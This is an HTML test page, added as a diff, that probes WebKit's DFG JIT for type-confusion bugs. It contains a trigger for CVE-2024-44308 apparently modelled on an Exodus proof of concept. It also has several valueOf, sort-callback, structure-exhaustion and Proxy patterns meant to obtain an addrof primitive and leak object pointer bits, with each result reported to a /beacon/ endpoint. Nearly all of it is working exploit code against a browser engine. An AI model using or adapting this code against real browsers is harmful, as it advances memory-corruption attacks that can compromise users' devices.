@@ -1,0 +1,393 @@
+<!--
+  p605: DFG type confusion tests
+
+  STRATEGY:
+  A. Feature detection: resizable ArrayBuffer, BigInt
+  B. CVE-2024-44308 trigger (needs resizable AB — CRASH RISK: HIGH if vuln)
+  C. valueOf array-type mutation (addrof direction, safe read-only)
+  D. Callback-during-sort mutation
+  E. Structure transition between DFG-cached reads
+
+  For C/D/E: if DFG reads an object slot as a double, the object pointer
+  bits reinterpreted as float64 produce a very small denormalized number
+  (< 1e-100). This is the SAFE addrof direction — no fake pointers.
+
+  CRASH_CLASS: MODERATE (B can crash if CVE-2024-44308 is live)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p605</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m),false);x.send();}catch(e){}}
+
+function main(){
+  b('P605-DFG-TYPE-CONFUSION');
+
+  // === SECTION A: Feature detection ===
+  b('SEC-A:FEATURES');
+
+  var hasResizableAB = false;
+  try {
+    var rab = new ArrayBuffer(0x100, {maxByteLength: 0x1000});
+    hasResizableAB = (typeof rab.resize === 'function');
+    b('RESIZABLE-AB:' + hasResizableAB + ',len=' + rab.byteLength +
+      ',maxLen=' + (rab.maxByteLength || 'undef') +
+      ',resizable=' + (rab.resizable || 'undef'));
+  } catch(e) {
+    b('RESIZABLE-AB:false,err=' + e.message);
+  }
+
+  var hasBigInt = typeof BigInt !== 'undefined';
+  b('BIGINT:' + hasBigInt);
+
+  var hasBigUint64 = typeof BigUint64Array !== 'undefined';
+  b('BIGUINT64ARRAY:' + hasBigUint64);
+
+  // === SECTION B: CVE-2024-44308 (only if resizable AB available) ===
+  b('SEC-B:CVE-2024-44308');
+
+  if (hasResizableAB) {
+    b('B-ATTEMPTING:resizable-AB-available');
+
+    try {
+      // Exodus PoC pattern: register corruption in compilePutByValForIntTypedArray
+      // The slow path for 0xffffffff (can't truncate to int32) leaves scratch2
+      // uninitialized, corrupting subsequent property stores.
+
+      function cve44308trigger(storeVal, fillObjs) {
+        var ab = new ArrayBuffer(0x100, {maxByteLength: 0x1000});
+        var u32a = new Uint32Array(ab);
+        var val = 0;
+        var t0 = fillObjs[0];
+        var t1 = fillObjs[1];
+        var t2 = fillObjs[2];
+        var t3 = fillObjs[3];
+        var t4 = fillObjs[4];
+        u32a[3] = storeVal;
+        t0.y = {};
+        t1.y = {};
+        t2.y = {};
+        t3.y = {};
+        t4.y = {};
+        return val;
+      }
+
+      // Warmup: DFG compiles with normal int32 stores
+      var fillers = [];
+      for (var i = 0; i < 8; i++) fillers.push({x: 1, y: 'init'});
+
+      for (var w = 0; w < 8000; w++) {
+        fillers = [];
+        for (var i = 0; i < 8; i++) fillers.push({x: 1, y: 'init'});
+        cve44308trigger(42, fillers);
+      }
+      b('B-WARMUP:OK');
+
+      // Trigger: 0xffffffff forces the DoubleRep slow path
+      var triggerObjs = [];
+      for (var i = 0; i < 8; i++) triggerObjs.push({x: 1, y: 'sentinel_' + i});
+
+      b('B-TRIGGER:about-to-fire');
+      var survived = false;
+      try {
+        cve44308trigger(0xffffffff, triggerObjs);
+        survived = true;
+      } catch(e) {
+        b('B-TRIGGER-THREW:' + e.message);
+      }
+
+      if (survived) {
+        b('B-SURVIVED:checking-corruption');
+        // Check if any property store went to wrong object
+        var anomalies = 0;
+        for (var i = 0; i < 5; i++) {
+          var yType = typeof triggerObjs[i].y;
+          if (yType !== 'object') {
+            anomalies++;
+            b('B-ANOMALY:obj' + i + '.y=' + String(triggerObjs[i].y) +
+              ',type=' + yType);
+          }
+        }
+        b('B-RESULT:anomalies=' + anomalies + ',survived=true');
+        if (anomalies > 0) {
+          b('★★★ B-CVE-44308-CORRUPTION-DETECTED ★★★');
+        }
+      }
+
+      // Run 50 more times to increase chance
+      var totalAnomalies = 0;
+      for (var round = 0; round < 50; round++) {
+        triggerObjs = [];
+        for (var i = 0; i < 8; i++) triggerObjs.push({x: 1, y: 'sentinel_' + i});
+        try {
+          cve44308trigger(0xffffffff, triggerObjs);
+          for (var i = 0; i < 5; i++) {
+            if (typeof triggerObjs[i].y !== 'object') totalAnomalies++;
+          }
+        } catch(e) { totalAnomalies++; }
+      }
+      b('B-50ROUNDS:anomalies=' + totalAnomalies);
+
+    } catch(ex) { b('B-ERR:' + ex.message); }
+  } else {
+    b('B-SKIP:no-resizable-AB');
+  }
+
+  // === SECTION C: valueOf array-type mutation (SAFE: read-only addrof) ===
+  b('SEC-C:VALUEOF-MUTATION');
+
+  // Theory: DFG caches ArrayWithDouble structure check.
+  // valueOf callback converts array to ArrayWithContiguous.
+  // DFG reads slot as double → object pointer bits as float64 → addrof!
+  //
+  // Detection: if result is a number < 1e-100 (denormalized), we read
+  // object pointer bits as a double. Safe — no fake pointers.
+
+  try {
+    var cArr;
+
+    // Pattern C1: valueOf during arithmetic that DFG compiles
+    function optC1(a, idx) {
+      var i = idx | 0;
+      return a[i];
+    }
+
+    var safeIdx = { valueOf: function() { return 0; } };
+    for (var w = 0; w < 12000; w++) {
+      cArr = [1.1, 2.2, 3.3, 4.4, 5.5];
+      optC1(cArr, safeIdx);
+    }
+    b('C1-WARMUP:OK');
+
+    var evilIdx = {
+      valueOf: function() {
+        cArr[0] = {};
+        return 0;
+      }
+    };
+
+    cArr = [1.1, 2.2, 3.3, 4.4, 5.5];
+    var c1Result = optC1(cArr, evilIdx);
+    var c1Type = typeof c1Result;
+    b('C1-RESULT:type=' + c1Type + ',val=' + String(c1Result));
+
+    if (c1Type === 'number' && c1Result !== 1.1 && !isNaN(c1Result)) {
+      if (Math.abs(c1Result) < 1e-100 && c1Result !== 0) {
+        b('★★★ C1-ADDROF-TYPE-CONFUSION ★★★');
+        // Read the bits via DataView
+        var leakBuf = new ArrayBuffer(8);
+        var leakF64 = new Float64Array(leakBuf);
+        var leakDV = new DataView(leakBuf);
+        leakF64[0] = c1Result;
+        var hi = leakDV.getUint32(4, true);
+        var lo = leakDV.getUint32(0, true);
+        b('C1-LEAKED:hi=0x' + hi.toString(16) + ',lo=0x' + lo.toString(16));
+      } else {
+        b('C1-DIFFERENT-NUMBER:' + c1Result);
+      }
+    } else if (c1Type === 'object') {
+      b('C1-OBJECT:DFG-bailed-correctly');
+    } else {
+      b('C1-OTHER:type=' + c1Type + ',val=' + String(c1Result));
+    }
+  } catch(ex) { b('C1-ERR:' + ex.message); }
+
+  // Pattern C2: Two reads with valueOf between them
+  try {
+    var c2Arr;
+    var c2Sink = {first: 0, second: 0};
+
+    function optC2(a, trigger, sink) {
+      sink.first = a[0];
+      var x = trigger.valueOf();
+      sink.second = a[0];
+    }
+
+    var safeT = { valueOf: function() { return 0; } };
+    for (var w = 0; w < 12000; w++) {
+      c2Arr = [1.1, 2.2, 3.3];
+      c2Sink = {first: 0, second: 0};
+      optC2(c2Arr, safeT, c2Sink);
+    }
+    b('C2-WARMUP:first=' + c2Sink.first + ',second=' + c2Sink.second);
+
+    var evilT = {
+      valueOf: function() {
+        c2Arr[0] = {};
+        return 0;
+      }
+    };
+
+    c2Arr = [1.1, 2.2, 3.3];
+    c2Sink = {first: 'S1', second: 'S2'};
+    optC2(c2Arr, evilT, c2Sink);
+
+    var s1Type = typeof c2Sink.first;
+    var s2Type = typeof c2Sink.second;
+    b('C2-RESULT:first.type=' + s1Type + ',first=' + String(c2Sink.first) +
+      ',second.type=' + s2Type + ',second=' + String(c2Sink.second));
+
+    if (s2Type === 'number' && s1Type === 'number' && c2Sink.second !== c2Sink.first) {
+      if (Math.abs(c2Sink.second) < 1e-100 && c2Sink.second !== 0) {
+        b('★★★ C2-STALE-READ-TYPE-CONFUSION ★★★');
+        var lb = new ArrayBuffer(8);
+        var lf = new Float64Array(lb);
+        var ldv = new DataView(lb);
+        lf[0] = c2Sink.second;
+        b('C2-LEAKED:hi=0x' + ldv.getUint32(4,true).toString(16) +
+          ',lo=0x' + ldv.getUint32(0,true).toString(16));
+      }
+    }
+  } catch(ex) { b('C2-ERR:' + ex.message); }
+
+  // Pattern C3: valueOf with different array element types
+  try {
+    var c3Arr;
+    var c3Sink = {val: 0};
+
+    function optC3(a, idx, sink) {
+      sink.val = a[idx + 0];
+    }
+
+    var safe3 = { valueOf: function() { return 0; } };
+    for (var w = 0; w < 12000; w++) {
+      c3Arr = [1.1, 2.2, 3.3];
+      c3Sink.val = 0;
+      optC3(c3Arr, safe3, c3Sink);
+    }
+    b('C3-WARMUP:val=' + c3Sink.val);
+
+    // Evil: change arr[0] to a string (different from object)
+    var evil3 = {
+      valueOf: function() {
+        c3Arr[0] = 'AAAA';
+        return 0;
+      }
+    };
+
+    c3Arr = [1.1, 2.2, 3.3];
+    c3Sink.val = 'SENTINEL';
+    optC3(c3Arr, evil3, c3Sink);
+    b('C3-RESULT:type=' + typeof c3Sink.val + ',val=' + String(c3Sink.val));
+    if (typeof c3Sink.val === 'number' && c3Sink.val !== 1.1) {
+      b('★★★ C3-STRING-AS-DOUBLE-CONFUSION ★★★');
+    }
+  } catch(ex) { b('C3-ERR:' + ex.message); }
+
+  // === SECTION D: Array.prototype.sort callback ===
+  b('SEC-D:SORT-CALLBACK');
+
+  try {
+    var dArr;
+    var dSink = {val: 0};
+
+    function optD(a, sink) {
+      var first = a[0];
+      a.sort(function(x, y) { return x - y; });
+      sink.val = a[0];
+      return first;
+    }
+
+    for (var w = 0; w < 6000; w++) {
+      dArr = [3.3, 1.1, 2.2];
+      dSink.val = 0;
+      optD(dArr, dSink);
+    }
+    b('D-WARMUP:val=' + dSink.val);
+
+    // Evil sort: replace elements with objects during sort
+    var sortCount = 0;
+    function optDEvil(a, sink) {
+      var first = a[0];
+      a.sort(function(x, y) {
+        sortCount++;
+        if (sortCount === 2) a[0] = {};
+        return x - y;
+      });
+      sink.val = a[0];
+      return first;
+    }
+
+    dArr = [3.3, 1.1, 2.2];
+    dSink.val = 'SENTINEL';
+    sortCount = 0;
+    var dFirst = optDEvil(dArr, dSink);
+    b('D-RESULT:first.type=' + typeof dFirst + ',sink.type=' + typeof dSink.val +
+      ',sink=' + String(dSink.val));
+    if (typeof dSink.val === 'number' && Math.abs(dSink.val) < 1e-100 && dSink.val !== 0) {
+      b('★★★ D-SORT-TYPE-CONFUSION ★★★');
+    }
+  } catch(ex) { b('D-ERR:' + ex.message); }
+
+  // === SECTION E: Structure transition mass-create ===
+  b('SEC-E:STRUCTURE-EXHAUST');
+
+  try {
+    // Create many unique structures to stress the structure table
+    // Detection: after exhaustion, DFG might confuse structures
+    var structs = [];
+    var maxStructs = 20000;
+    for (var i = 0; i < maxStructs; i++) {
+      var obj = {};
+      obj['p' + i] = i;
+      structs.push(obj);
+    }
+    b('E-CREATED:' + maxStructs + ' unique structures');
+
+    // Now create two objects with similar but different shapes
+    var shapeA = {a: 1, b: 2, c: 3.3};
+    var shapeB = {a: {}, b: {}, c: {}};
+
+    function optE(obj) {
+      return obj.c;
+    }
+
+    // Warm up with shapeA (DFG specializes for doubles)
+    for (var w = 0; w < 10000; w++) {
+      optE(shapeA);
+    }
+    b('E-WARMUP:c=' + optE(shapeA));
+
+    // Now pass shapeB — if structure ID collision happened,
+    // DFG reads shapeB.c as a double instead of object
+    var eResult = optE(shapeB);
+    b('E-RESULT:type=' + typeof eResult + ',val=' + String(eResult));
+    if (typeof eResult === 'number') {
+      b('★★★ E-STRUCTURE-ID-CONFUSION ★★★');
+    }
+  } catch(ex) { b('E-ERR:' + ex.message); }
+
+  // === SECTION F: Proxy + DFG (long shot) ===
+  b('SEC-F:PROXY');
+
+  try {
+    if (typeof Proxy !== 'undefined') {
+      var fArr = [1.1, 2.2, 3.3];
+      var pArr = new Proxy(fArr, {
+        get: function(target, prop) {
+          if (prop === '0' && target[1] === 2.2) {
+            target[0] = {};
+          }
+          return target[prop];
+        }
+      });
+
+      function optF(a) { return a[0]; }
+
+      // Warm up with real array
+      for (var w = 0; w < 10000; w++) {
+        optF([1.1, 2.2, 3.3]);
+      }
+
+      // Now pass proxy — DFG might not bail
+      fArr = [1.1, 2.2, 3.3];
+      var fResult = optF(pArr);
+      b('F-RESULT:type=' + typeof fResult + ',val=' + String(fResult));
+    } else {
+      b('F-SKIP:no-Proxy');
+    }
+  } catch(ex) { b('F-ERR:' + ex.message); }
+
+  b('P605-COMPLETE');
+}
+
+setTimeout(main, 100);
+</script></head><body>p605: DFG type confusion</body></html>
